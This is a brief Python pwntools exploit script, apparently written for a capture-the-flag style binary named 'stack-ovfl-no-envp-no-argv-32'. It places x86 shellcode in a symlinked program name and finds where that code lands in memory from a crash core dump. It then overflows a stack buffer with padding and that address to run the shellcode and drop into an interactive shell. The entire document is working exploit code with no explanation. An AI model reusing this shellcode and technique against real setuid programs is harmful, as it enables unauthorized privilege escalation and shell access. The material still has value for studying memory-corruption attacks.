#! /usr/bin/env python
from pwn import *
from os import symlink
#env = {
#   'shell' : 'j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2Qhn/shh//bi\x89\xe3j\x0bX\xcd\x80'
#}

shell = 'j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2QjA\x89\xe3j\x0bX\xcd\x80'
fname = './stack-ovfl-no-envp-no-argv-32'


print(fname)
if not os.path.exists(fname+shell):
    symlink(fname, fname+shell)


p = process(fname + shell)

if not os.path.exists('./core'):
    p.writeline('A' * 0x20)
    p.wait()

c = Core('./core')

addr_env = c.stack.find(shell)

p = process(fname + shell)
buf = 'A' * 0x10 + p32(addr_env)

with open('in.txt', 'w') as f:
    f.write('%s\n' % buf)
    f.close()

p.writeline(buf)

p.interactive()


